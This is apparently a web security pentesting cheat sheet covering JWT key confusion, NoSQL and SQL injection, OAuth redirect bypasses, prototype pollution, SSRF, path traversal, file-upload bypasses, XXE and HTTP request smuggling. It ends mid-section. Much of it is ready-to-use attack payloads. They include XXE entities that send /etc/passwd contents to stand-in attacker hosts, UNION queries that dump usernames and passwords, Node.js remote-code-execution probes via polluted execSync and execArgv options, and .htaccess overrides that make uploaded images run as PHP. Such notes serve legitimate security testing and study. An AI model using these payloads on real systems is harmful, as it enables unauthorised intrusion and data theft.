Algorithm confusion attacks (also known as key confusion attacks) occur when an attacker is able to force the server to verify the signature of a JSON web token (JWT) using a different algorithm than is intended by the website's developers. If this case isn't handled properly, this may enable attackers to forge valid JWTs containing arbitrary values without needing to know the server's secret signing key. 

Generally developers assume that the application will exclusively handle JWTs signed using an asymmetric algorithm like RS256. Due to this flawed assumption, they may always pass a fixed public key to the method that verifies a JWT.

- If the server receives a token signed using a symmetric algorithm like HS256, the library that implements the validation method might treat the public key as an HMAC secret. 
- This means that an attacker could sign the token using HS256 and the public key, and the server will use the same public key to verify the signature. 


\***Note**: The public key used to sign the token must be absolutely identical to the public key stored on the server. This includes using the same format (such as X.509 PEM) and preserving any non-printing characters like newlines. 

- It may be needed to experiment with different formatting in order for this attack to work.

JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as `/.well-known/jwks.json`. JWK Sets may contain public keys if asymmetric algorithms are used to sign an application's JWTs.

If public key is not publicly exposed, it's possible to derive it by using the `jwt_forgery.py` from the [rsa2sign](https://github.com/silentsignal/rsa_sign2n) repository. Alternatively, the following uses the previously mentioned script to derive some possible keys and generate each of them to sign a JWT token:

```shell
docker run --rm -it portswigger/sig2n <token1> <token2> 
```

For each possible key, the scripts outputs:

- A Base64-encoded PEM key in both X.509 and PKCS1 format.
- A forged JWT signed using each of these keys.
## NoSQL Injection (NoSQLi)

Fuzz strings to check if any possible NoSQLi in `$where`:

```
'"`{
;$Foo}
$Foo \xYZ
```

Add a null character after the category value. MongoDB may ignore all characters after a null character. This means that any additional conditions on the MongoDB query are ignored:

```
https://insecure-website.com/product/lookup?category=fizzy'%00

results in: this.category == 'fizzy'\u0000' && this.released == 1

' && this.released == 1 are ignored
```

When operator injection is available, it's possible to enumerate an object field name by injection the following payload:

```
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

**Note**: field at position 0 should generally be `_id`

## OAuth2

Useful resource: [https://portswigger.net/web-security/oauth](https://portswigger.net/web-security/oauth)

Interesting endpoints:

```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```

These will often return a JSON configuration file containing key information, such as details of additional features that may be supported

When auditing an OAuth flow, you should try experimenting with the `redirect_uri` parameter to understand how it is being validated:

- Check if the domains are validated by checking only the starting value of the provided string: Es: `redirect_uri.startsWith("<valid domain>")`
- By appending extra-values to the default `redirect_uri` you might be able to exploit discrepancies between the parsing of the URI by the different components of the OAuth service. Es: `https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`
- Server-side parameter pollution: `https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net`
- Some servers also give special treatment to `localhost`: try something like `localhost.evil-user.net`
- Try change `response_mode` from `query` to `fragment`; can sometimes completely alter the parsing of the `redirect_uri`, opening to new possibilities

**Scope Upgrade**

When dealing with the authorization code flow, try tampering the `scope` parameter by adding some other scopes (such as `profile`) :

- If the server does not validate this against the scope from the initial authorization request, it will sometimes generate an access token using the new scope

For the implicit flow, since the access token is sent via the browser, an attacker could simply steal an access token and send a normal browser-based request to the OAuth service's `/userinfo` endpoint, manually adding a new `scope` parameter in the process.

- The OAuth service should validate this `scope` value against the one that was used when generating the token, but this isn't always the case

**OpenID Connect**

OpenID Connect extends the OAuth protocol to provide a dedicated identity and authentication layer that sits on top of the basic OAuth implementation.
OpenID Connect services use an identical set of scopes for all the providers (instead of different scopes for different providers as in OAuth). In order to use OpenID Connect, the client application must specify the scope `openid` in the authorization request.

Following the list of the other scopes to specify after `openid`:

- `profile`
- `email`
- `address`
- `phone`

OpenID adds another `response_type`: the `id_token`, that contains a JSON web token (JWT) signed with a JSON web signature (JWS).

You may also be able to access the configuration file from the standard endpoint `/.well-known/openid-configuration`.

If the application allows **dynamic client registration**, check if it is *unprotected* (does not require authentication):

- Generally, an OpenID provider should require the client application to authenticate itself.
- Allowing dynamic client registration without any authentication enables an attacker to register their own malicious client application, potentially leading to vulnerabilities like SSRF if URLs provided in the registration request are accessed by the OpenID provider.

Example of OpenId Connect client registration:

```
POST /openid/register HTTP/1.1
Content-Type: application/json
Accept: application/json
Host: oauth-authorization-server.com
Authorization: Bearer ab12cd34ef56gh89

{
    "application_type": "web",
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ],
    "client_name": "My Application",
    "logo_uri": "https://client-app.com/logo.png",
    "token_endpoint_auth_method": "client_secret_basic",
    "jwks_uri": "https://client-app.com/my_public_keys.jwks",
    "userinfo_encrypted_response_alg": "RSA1_5",
    "userinfo_encrypted_response_enc": "A128CBC-HS256",
    …
}
```

Some OpenID providers give you the option to pass these in as a JSON web token (JWT) instead. If this feature is supported, you can send a single `request_uri` parameter pointing to a JSON web token that contains the rest of the OAuth parameters and their values.

- Some servers may effectively validate the query string in the authorization request, but may fail to adequately apply the same validation to parameters in a JWT, including the `redirect_uri`.

## Prototype Pollution

Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys:

- Due to the special meaning of `__proto__` in a JavaScript context, the merge operation may assign the nested properties to the object's prototype instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way. 
- Common pollution target is `Object.prototype`.

Generic probe with URL source:

- Try polluting `Object.prototype` by injecting an arbitrary property via the query string: `/?__proto__[foo]=bar` and then check in DevConsole if the pollution has been successfull.

If `__proto__` is stripped from any user controllable input, try polluting via the constructor.

- Prototype pollution via the constructor is possible when **the prototype is not set to null** (i.e. Object created with `Object.create(null);`) and the `constructor.prototype` property is user controllable. `constructor.prototype` is equivalent to `__proto__`.

Another possibility is to pollute one of the properties passed to `fetch()` browser API as second parameter. These are passed as an object and therefore, if a suitable source is found, an attacker could pollute `Object.prototype` in order to override one of these properties. Properties could be:

- `headers`
- `body`
- etc.

It's also possible to perform prototype pollution via `Object.defineProperty()`. This method enables the developer to set a non-configurable, non-writable property directly on the affected object. As for `fetch()` API, also `Object.defineProperty()` accepts an object as third parameter. This parameter is called "descriptor" and, being an object, is "pollutable" by the `Object.prototype.

- For example, the descriptor allows to define a default value for the defined property by mean of the `value` descriptor property. If this property is not used, it could be possible for an attacker to override it by prototype pollution.

For server-side prototype pollution, remember that the `for...in` loops also over properties inherited from the prototype. If a user controllable input such as a `POST` request body vulnerable to pollution and its properties are iterated with the `for...in` loop, the injected prototype property will be also evaluated.

- if the polluted property is reflected somewhere, it's easier to identify a server-side pollution.


For example:

```json
{
	"address_line_1":"Wiener HQ",
	"address_line_2":"One Wiener Way",
	"city":"Wienerville",
	"postcode":"BU1 1RP",
	"country":"UK",
	"sessionId":"FP293HMQv1CTO8TZoGSjr5Yu5vDHlsnh",
	"__proto__":{
		"isAdmin":true
	}
}
```

Detecting server-side prototype pollution without polluted property reflection:

- **Status-code override**: for example, in node error responses there's the property `status`. Try overriding this property with values between 400 and 599.
- **JSON spaces override**: The Express framework provides a `json spaces` option, which enables you to configure the number of spaces used to indent any JSON data in the response. Try changing this property. Although the prototype pollution has been fixed in Express 4.17.4, websites that haven't upgraded may still be vulnerable. Remember that Burp auto-indent responses so set the response view to raw.
- **Charset Override**: Try sending a value encoded with a different charset, then override the charset and resend the value to check if the charset on the server has changed. The Express' `body-parser` module uses the property `content-type`. If a suitable prototype pollution source is found, try overriding this property.

Following an example of Charset Override to UTF-7 in Express:

```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    },
	// OR with constructor.prototype
	"constructor":{
		"prototype":{
			"isAdmin": true
		}
	}
}
```

Example of Node RCE probe:

```json
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```

If the server uses the `fork()` from `child_process` module: 

- `fork()` accepts an options object in which one of the potential options is the `execArgv` property. If it's left undefined by the developers, this potentially also means it can be controlled via prototype pollution.

Example of Node RCE via `fork()`'s `execArgv` pollution:

```json
"__proto__": {
	"execArgv": [
		"--eval=child_process.execSync('id')"
	]
}
```

If the server code runs `execSync` itself, it could be possible to obtain an RCE by polluting the following properties:

- The `input` property is a string containing the command to execute. If not defined by the developer (the command can be passed also as parameter to the function), it could be polluted.
- The `shell` option lets developers declare a specific shell in which they want the command to run.

Example of RCE via `execSync`:

```json
"__proto__": {
	"shell":"vim",
	"input":":! <command>\n"
}
```

\*Note:

- The `shell` option only accepts the name of the shell's executable and does not allow you to set any additional command-line arguments.
- The shell is always executed with the `-c` argument, which most shells use to let you pass in a command as a string. However, setting the `-c` flag in Node instead runs a syntax check on the provided script, which also prevents it from executing. As a result, although there are workarounds for this, it's generally tricky to use Node itself as a shell for your attack.
- As the `input` property containing your payload is passed via `stdin`, the shell you choose must accept commands from `stdin`.

## Race Conditions

Following a list of checks to perform in order to understand the applicability of a race condition attack:

- Check if delay is due endpoint logic or back-end connection by sending **sequential requests** (i.e "connection warming"): if the first takes way more time than the others, the latency is due the back-end  and not due the logic implemented by the endpoint. **Back-end connection delays don't usually interfere with race condition attacks because they typically delay parallel requests equally, so the requests stay in sync.**
-  Check if any session-based lock mechanism; for example, PHP locks on the session id by default, so a separate session for every request in the batch is needed in order to make them be processed in parallel.
- Web servers often delay the processing of requests if too many are sent too quickly. If connection warming doesn't make any difference, sending a large number of dummy requests to intentionally trigger the rate or resource limit, may allow to cause a suitable server-side delay.

Reference: [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

## Same-Origin Policy (SOP)

Generally, loading cross-site resources is allowed (images, video, audio) but Javascript is prevented from accessing their content with some exceptions:

- Cross-domain iframes or windows `location` and `location.href` are **writable** but not readable
- Cross-domain `window.length` (number of frames) and `window.closed` are **readable** but not writable.
- It's possible to cross-domain use the `replace` function on the `location` object.
- Some functions such as `window.close`, `window.blur` and `window.focus` are allowed cross-domain.
- The `postMessage` function can be used to send cross-domain messages to iframes or windows.

Due to legacy requirements, the same-origin policy is more relaxed when dealing with cookies, so **they are often accessible from all subdomains of a site** even though each subdomain is technically a different origin. Partially mitigated by the `HttpOnly` cookie attribute.

It's possible to relax same-origin policy using `document.domain` by setting a specific domain for both the cross-site sites for which SOP is being relaxed. 

If an attacker has control on the `document.domain`, can manipulate to allow cross-domain interactions toward a domain he controls.
## SAML

Refer to: [SAML](../books/attacking-and-exploiting-modern-web-applications.md#saml)

## Server-Side Request Forgery (SSRF)

Check the `Referer` header; if used for analytics purposes can be abused to achieve a blind SSRF.

### SNI SSRF

SNI SSRF is the vulnerability that occurs when an SNI proxy uses the SNI field value without validation to specify the back-end server. This then allows an attacker to send traffic to an arbitrary back-end server which they were not intended to access via the SNI proxy, and typically receive the back-end server’s response.

Reference:

- [Exploiting SNI SSRF to access the AWS IDMSv2 service](https://appcheck-ng.com/exploiting-sni-ssrf-to-access-the-aws-idmsv2-service/)

### Bypasses

Here's a list of some bypasses for **black-list based filters**:

- Alternatives to `127.0.0.1`: `2130706433`, `017700000001`, `127.1`
- Register a domain name that resolves to `127.0.0.1` or use `spoofed.burpcollaborator.net`
- **URL Encoding** or **Case variations**
- Use an attacker-controlled URL to redirect the application to the target URL. Try using different status code and protocols.
- Abuse an Open Redirect


Here's a list of some bypasses for **black-list based filters**:

```
https://expected-host:fakepassword@evil-host

https://evil-host#expected-host

https://expected-host.evil-host

URL Encoder or Double URL Encode filtered strings

Abuse an Open Redirect
```

## SQL Injection

Useful resource: [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

DB version query:

```sql
Microsoft, MySQL : SELECT @@version

Oracle: SELECT * FROM v$version

PostgreSQL: SELECT version()

SQLite: sqlite_version()
```

Get database name:

```sql
0 UNION SELECT 1,2,database()
```

Get list of tables in db:

```sql
0 UNION SELECT 1,2, group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one
```

Get list of columns in table:

```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

Extract information:

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```


Time based check :

```sql
admin123' UNION SELECT SLEEP(5);--
```

Note: If no delay is returned, the number of columns could be wrong.


In **UNION-based SQLi**, the columns types must match; NULL is convertable in any (nullable) type and it's useful to enumerate the correct number of columns.

```sql
' UNION SELECT NULL,NULL,NULL--
```


When dealing with **ORACLE** DBs, every SELECT query must be accompanied by the FROM clause and it has to specify a valid table:

```sql
' UNION SELECT NULL FROM DUAL--
```

With **Blind SQLi** sometimes no feedback is returned regardless of whether the query returns any data. In these cases could be useful to trigger conditional errors; ery often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message.

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Turn visible some Blind SQLi results - applicable when there's a database error pattern disclosure:

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

## Open Redirect

DOM-based open redirects sinks:

```javascript
location
location.host
location.hostname
location.href
location.pathname
location.search
location.protocol
location.assign()
location.replace()
open()
element.srcdoc
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.ajax()
$.ajax()
```

### Bypasses

Multiple /:

```
?url=https:///google.com
```

Space before the url:

```
?url=+https://google.com
```

Escape char on the second /:

```
?url=+https:/\/google.com
```


`startWith` or `indexOf` "target.com:" 

```
target.com.attacker.com
```

Fake relative: 

```
//attacker.com
```

/\\? before the @:

```
https://attacker.com\@target.com
https://attacker.com?@target.com
```

Multiline regex: 

```
attacker.com%0d%0atarget.com
```


## File Inclusion

### PHP Filters and Wrappers

Pass arbitrary data using the `data://` wrapper in input:

```
data://text/plain;base64,<base64 encoded data>
```

Consider the following code:

```php
echo json_decode(file_get_contents($userControlledInput), true);
```

Passing a system file path into the `$userControlledInput` WON'T work since the `json_decode` function expects a valid JSON content in the file being read. In order to allow exfiltrating also non-JSON files content, i'ts possible to create a **filter chain** using [wrapwrap](https://github.com/ambionics/wrapwrap) that will prepend and append some chars, making the content JSON-valid:

```shell
python wrapwrap.py <file to exfiltrate> <prefix> <suffix> <number of bytes>

# Example
python wrapwrap.py /etc/passwd '{"x":"' '"}' 1000
python wrapwrap.py /etc/passwd '"' '"' 1000 # string in quote are JSON valid
```

### Bypasses

```
....//                # ./ is getting replaced by something like (./)     
....\/
%2e%2e%2f             # URL Encoding
%252e%252e%252f       # Double URL Encoding
..%c0%af              # https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work
..%ef%bc%8f
/var/www/images/../../../etc/passwd  # App is checking base path
../../../etc/passwd%00.png           # App is checking file extension
```

## File Upload 

### Bypasses

Setup file *Magic Bytes* in order to bypass file type checking:

```
hexeditor -b filename 
```

Useful resource: [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) 

Exploit NGINX virtual directories forcing it to interpet images as PHP (on older version of PHP) - [see there](https://security.stackexchange.com/questions/90968/arbitrary-file-upload-serve-jpg-as-php/90969#90969):

```
/shell.jpg/shell.php
```

Exploit Apache mod_mime extension to force it to interpet images as php (on older version of php) - [see there](https://security.stackexchange.com/questions/90968/arbitrary-file-upload-serve-jpg-as-php/90969#90969):

```
/shell.php.jpg
```

Test multiple PHP extension when .php is not interpeted:

```
phtml
php
php3
php4
php5
php7
php8
phar
... # Consider using a wordlist
```

If there are insufficient restrictions on the file upload, but some principal extensions are anyway blocked (ex: php), try overwriting the WebServer configuration in order to bypass the restrictions:

```
# .htaccess - Run .png as php files
AddHandler application/x-httpd-php .png
```

For IIS, the config file is `web.config`.

Other  bypasses:

```
exploit.php%00.png # Use null bytes to break parsing

exploit.asp;.jpg  # Use semicolon

exploit.php. # trailing chars such as whitespaces or dot

exploit%2Ephp # URL encode dot and slashes - Try also to double URL encode

`xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E`
```

## XML External Entities Injection (XXE)

Note: In some languages, such as PHP, XXE vulnerabilities may lead to RCE. In other languages like Java, it's not possible to execute code with just an XXE vulnerability.

**Document Type Definition (DTD)**

The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional `DOCTYPE` element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an "internal DTD") or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.

**XML Internal Entities**

Internal entities are locally defined **within the DTD**.

```xml
<!ENTITY name "internal_entity_value">
```


**XML External Entities**
XML external entities are a type of custom entity whose definition is located **outside of the DTD** where they are declared.
The declaration of an external entity uses the `SYSTEM` keyword and must specify a URL from which the value of the entity should be loaded

External Entities can be **private** or **public**:

- **Private**: the `SYSTEM` keyword indicates that the external entity is private, meaning that its usage is restricted to single user or group of users.
- **Public**: the `PUBLIC` keyword indicates that the external entity is public, meaning that its usage is intended for a wider audience.

```xml
<!-- Private External Entity -->
<!ENTITY name SYSTEM "external_entity_URI">

<!-- Public External Entity -->
<!ENTITY name PUBLIC "public_user_or_group_id" "external_entity_URI">
```

Note that XML entities are allowed to store non-XML values. In some constrained parsing scenario (eg. strictly typed language with model binding), in order to prevent the parser to expect these value to be XML-formatted, it's possible to the `NDATA TYPE` declaration to indicate to skip parsing these values.

```xml
<!-- Private External Entity -->
<!ENTITY name SYSTEM "external_entity_URI" NDATA TYPE>

<!-- Public External Entity -->
<!ENTITY name PUBLIC "public_user_or_group_id" "external_entity_URI" NDATA TYPE>
```

**Note**: when `NDATA TYPE` is not allowed, in order to allow including files containing XML chars such as `<` or `>`, which would otherwise break the parsing, it's necessary to wrap the file content within a `<![CDATA[]]>` section. See payloads below.

**XML Parameters Entities**
XML parameter entities are a special kind of XML entity which can only be referenced elsewhere **within the DTD**. The declaration of an XML parameter entity as well as its referencing (instead of the `&`) includes the `%` character before the entity name.

```xml
<!ENTITY % name SYSTEM "parameter_entity_URI">
```

### XXE Payloads

XXE File Inclusion:

```xml
<!-- Using XML External Entities -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
...
<bar>&xxe;</bar>
...


<!-- Using XML Parameters Entities -->
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>
```

Bypass including file containing XML characters that break the parsing using an external DTD, wrapping the file content within a  `<![CDATA[]]>` section:

```xml
<!-- Remote DTD hosted by attacker -->
<!ENTITY wrapper "%start;%file;%end;">


<!-- Include the remote DTD with parameters entities -->
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///targetfile" >
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://attacker/wrapper.dtd" >
%dtd;
]>
...
 <bar>&wrapper;</bar>
...
```


XXE SSRF:

```xml
<!-- Using XML External Entities -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://target"> ]>
...
<bar>&xxe;</bar>
...


<!-- Using XML Parameters Entities -->
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://target"> %xxe; ]>
```


XXE by Remote DTD hosted by the attacker:

```xml
<!-- Remote DTD hosted at http://attacker/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;


<!-- Include the remote DTD with external entities -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe;]>
...

<!-- Include the remote DTD with parameters entities -->
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe; ]>
```

XXE by remote DTD hosted by the attacker triggering an error to retrieve data:

```xml
<!-- Remote DTD hosted at http://attacker/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;


<!-- Include the remote DTD with external entities -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe;]>
...

<!-- Include the remote DTD with parameters entities -->
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe; ]>
```

**Note**: some XML parsers fetch the URL in the external entity definition using an API that validates the characters that are allowed to appear within the URL so the attack might not work on some file contents containing invalid URL chars like the newline.

**DTD Repurposing**

Using an XML **parameter entity within the definition of another parameter entity** is generally permitted in external DTDs but not in internal DTDs.

When an external evil DTD can't be loaded, if the target document's DTD uses a hybrid of internal and external DTD declarations, then the internal DTD can redefine entities that are declared in the external DTD.

- An attacker could employ the error-based technique from within an internal DTD, **provided the XML parameter entity that they use is redefining an entity that is declared within an external DTD**, repurposing it.

```xml
<!-- Payload repurposing a local DTD -->
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///<known local DTD path defining the custom_entity entry>">
<!ENTITY % custom_entity '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error;'>
%local_dtd;
]>
```

**XInclude**
When the attacker has no control of the whole document, i.e. can't define the DOCTYPE, but controls at least a single item that gets included in a server-side processed XML, it could be possible to exploit the **XInclude** feature

- XInclude allows an XML document to be built from sub-documents

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <!-- The namespace must be referenced -->

<!-- LFI-->
<xi:include parse="text" href="file:///etc/passwd"/></foo>

<!-- Or SSRF-->
<xi:include parse="text" href="http://attacker.com"/></foo>
```

**Note**: the `parse` attribute can be valued with "text" or "xml" (default "xml"); when including non-XML files, not setting the `parse` attribute to "text" would trigger an error.

**Content Type**
Some hidden XXE surface can be found by forcing the content type header in the request to be `text/xml`; some web server or application could be processing the XML passed in the body.

**Soap Envelope**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope xmlns:soapenv="attacker.net">
	<soapenv:Header/>
	<soapenv:Body>
			<changeUserPassword><usermname>&test;</username>
				<curpwd>abcdef</curpwd>
				<newpwd>abedef</newpwd>
			</changeUserPassword>
		</soapenv:Body>
	</soapenv:Envelope>
```

## Request Smuggling

### HTTP/1.1

Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request ends: the `Content-Length` header and the `Transfer-Encoding` header.

- The `Transfer-Encoding` header is used to specify that the request body contains one or more *chunks*.
- Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero.

Example of chunk:

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

Websites that use **HTTP/2** end-to-end are inherently immune to request smuggling attacks. As the HTTP/2 specification introduces a single, robust mechanism for specifying the length of a request, there is no way for an attacker to introduce the required ambiguity.

**The attack**: If the front-end and back-end servers behave differently in relation to the (possibly obfuscated) `Transfer-Encoding` header, then they might disagree about the boundaries between successive requests, leading to request smuggling vulnerabilities.

- **CL.TE**: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header. 
- **TE.CL**: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
- **TE.TE**: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.

\***Note**: Smuggled request must contain a body otherwise the back-end server will see the smuggled  and the following requests as two distinct normal requests. Smuggling a request that contains a body implies that the next request on the connection will be appended to it.

**CL.TE**

- `Content-Length` value should wrap the whole request.
- The chunk in the body of arbitrary size is followed by the content to be smuggled.

Example of **CL.TE**:

```
POST / HTTP/1.1
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**TE.CL**

- The first chunk contains the whole request body and it's followed by a 0-length chunk.
- The `Content-Length` value is set to wrap the body until the first chunk size, leaving the rest of the body unprocessed (smuggled).
- The trailing sequence `\r\n\r\n` following the final `0` is needed.

Example of **TE.CL**:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3 // Note that 3 because of "\r\n" + "8"
Transfer-Encoding: chunked

8
SMUGGLED // There insert an HTTP request well formatted (if post, must contain content-length/transfer-encoding and content-type header)
0


```

\*Note: smuggled content-length must consider the fact that the next request will be included into the body of the smuggled request

**TE.TE**

- To uncover a TE.TE vulnerability, it is necessary to find some variation of the `Transfer-Encoding` header such that only one of the front-end or back-end servers processes it, while the other server ignores it.
- The `Content-Length` value is set to wrap the body until the first chunk size, leaving the rest of the body unprocessed (smuggled).
- The trailing sequence `\r\n\r\n` following the final `0` is needed.

Example of  `Transfer-Encoding` obfuscation:

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

### HTTP/2

HTTP/2 messages are sent over the wire as a series of separate "frames". Each frame is preceded by an explicit length field, which tells the server exactly how many bytes to read in. Therefore, the length of the request is the sum of its frame lengths. With this mechanism, there is no way for an attacker to introduce the required ambiguity as long as the website uses HTTP/2 end to end.

#### HTTP/2 downgrading

As HTTP/2 is still relatively new, web servers that support it often still have to communicate with legacy back-end infrastructure that only speaks HTTP/1:

- **HTTP/2 downgrading**: Many websites have an HTTP/2-speaking front-end server, but deploy this in front of back-end infrastructure that only supports HTTP/1. This means that the front-end effectively has to translate the requests it receives into HTTP/1. When the HTTP/1-speaking back-end issues a response, the front-end server reverses this process to generate the HTTP/2 response that it returns to the client.

HTTP/2 don't have to specify their length explicitly in a header; in a downgraded HTTP/2 request to HTTP/1 a `Content-Length` header is derived from the sum of the lengths of the frames the request is composed by.

- However, it's possible to explicit the `content-length` header\* in a HTTP/2 request. By specs, it must match the sum of the lengths of the frames but it isn't always validated and the `content-legnth` **could be used as it is in the downgraded request**, making room for some smuggling attacks (**H2.CL**).
- Chunked transfer encoding is incompatible with HTTP/2 and the spec recommends that any `transfer-encoding: chunked` header you try to inject should be stripped or the request blocked entirely. If the front-end server fails to do this, and subsequently downgrades the request for an HTTP/1 back-end **that does support chunked encoding,** this can also enable request smuggling attacks (**H2.TE**).
- Since HTTP/2 messages are binary rather than text-based, the boundaries of each header are based on explicit, predetermined offsets rather than delimiter characters and therefore `\r\n` can be used as part of an header value. If the front-end server downgrades an HTTP/2 request containing these characters, these will be interpreted as delimiter, leading to an header injection via **CRLF injection**. Useful when previous techniques are being blocked by the front-end server.
	- Take a look to [HTTP/2 exclusive vectors](https://portswigger.net/web-security/request-smuggling/advanced/http2-exclusive-vectors) for other injectable vectors!
- **Response queue poisoning** is a form of request smuggling attack that causes a front-end server to start mapping responses from the back-end to the wrong requests.
- **HTTP/2 Request splitting** is a form of request smuggling attack similar to the **response queue poisoning** where a complete HTTP request is smuggled but, this time, it is smuggled in an HTTP/2 header instead of the body.
- **HTTP Request Tunneling** is a form of request smuggling attack that is useful when the server doesn't use the same connection for the attacker and the victim. The attack consists into sending a single request that will elicit two responses from the back-end, where the second response is nested into the first response so that the front-end server only sees one request and one response.

\*Note: HTTP/2 requests's headers are always lowercase

##### **H2.CL**

- Set `content-length` to 0.
- In the body, pass the whole request to smuggle with a `Content-Length` a little greater than the effective request body size so that the next request is not processed.

Example:

```
GET / HTTP/2
content-type: application/x-www-form-urlencoded
content-length: 0

SMUGGLED
```

##### **H2.TE**

- Set the header `transfer-encoding: chunked`.
- In the body pass an empty chunk followed by the request to smuggle

Example:

```
GET / HTTP/2
content-type: application/x-www-form-urlencoded
transfer-encoding: chunked

0

SMUGGLED
```

###### **Request Smuggling via CRLF Injection**

- Inject the `Content-Length` header or the `Transfer-Encoding` header in another request header by using `\r\n` chars.
##### **Response queue poisoning**

\*Note: This attack is possible both via classic HTTP/1 request smuggling and by exploiting HTTP/2 downgrading.

Criteria:

- The TCP connection between the front-end server and back-end server **is reused for multiple request/response cycles**.
- The attacker is able to successfully **smuggle a complete, standalone request** that receives its own distinct response from the back-end server.
 - The attack does not result in either server closing the TCP connection. Servers generally close incoming connections when they receive an invalid request because they can't determine where the request is supposed to end. When performing request smuggling, this typically happens with the "leftovers" of last request to be appended to the smuggled request body that are not included by the smuggled `Content-Length`; **the remaining part of this request don't form a valid request and therefore causes a connection close**.

The key is to smuggle a complete request instead of just a prefix like in the classic smuggling attacks. Once the response queue is poisoned, the attacker can just send an arbitrary request to capture another user's response since the response queue is misaligned due the smuggled complete request.

Example:

```
POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Content-Type: x-www-form-urlencoded\r\n
Content-Length: 61\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /anything HTTP/1.1\r\n // Complete request
Host: vulnerable-website.com\r\n
\r\n
GET / HTTP/1.1\r\n // Next request not being broken
Host: vulnerable-website.com\r\n
\r\n
```

##### **HTTP/2 request splitting**

When performing a request splitting attack, it's important to take in account the **front-end rewriting**:

- The front-end server, during the downgrade, may be appending the `Host` header to the downgraded request last header; because of the request splitting, the downgraded request (the first slice) might not have any host header and, eventually, the smuggled request (the second slice) might result in two `Host`headers.
	-  Position the injected `Host` header so that it ends up in the first request once the split occurs

##### **HTTP request tunnelling**

Request tunnelling is possible with both HTTP/1 and HTTP/2 but is considerably more difficult to detect in HTTP/1-only environments. 

- Due to the way persistent (keep-alive) connections work in HTTP/1, even if two responses are received, this doesn't necessarily confirm that the request was successfully smuggled

Leak internal headers:

